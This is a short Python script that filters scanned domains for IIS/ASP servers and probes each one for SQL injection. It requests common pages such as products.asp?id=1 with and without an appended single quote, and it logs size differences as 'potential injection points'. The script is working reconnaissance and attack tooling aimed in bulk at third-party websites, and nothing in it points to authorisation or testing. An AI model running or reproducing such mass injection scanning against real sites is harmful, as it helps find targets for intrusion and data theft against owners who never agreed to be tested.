import json, glob, subprocess

sites = []
for f in glob.glob('/tmp/scan_results/*.json'):
    d = json.load(open(f))
    server = d.get('server', '')
    if 'IIS' in server or 'ASP' in server or 'asp' in server.lower():
        sites.append(d['domain'])

print('ASP/IIS sites:', len(sites))

params = ['/news11.asp?id=1', '/products.asp?id=1', '/product.asp?id=1',
          '/about.asp?id=1', '/news.asp?id=1', '/class1_index.asp?id=1']

results = []
for site in sites:
    for param in params:
        try:
            r1 = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','3',
                'http://'+site+param,'-o','/dev/null','-w','%{size_download}'],
                capture_output=True,text=True,timeout=5)
            normal = r1.stdout.strip()
            if normal == '0': continue
            
            r2 = subprocess.run(['curl','-sk','--connect-timeout','2','--max-time','3',
                'http://'+site+param[:-1]+'%27','-o','/dev/null','-w','%{size_download}'],
                capture_output=True,text=True,timeout=5)
            inj = r2.stdout.strip()
            
            if normal != inj:
                diff = abs(int(normal or 0) - int(inj or 0))
                if diff > 100:
                    print(site + param + ': ' + normal + 'B -> ' + inj + 'B (diff=' + str(diff) + ')')
                    results.append((site, param, normal, inj))
        except:
            pass

print('Found ' + str(len(results)) + ' potential injection points')
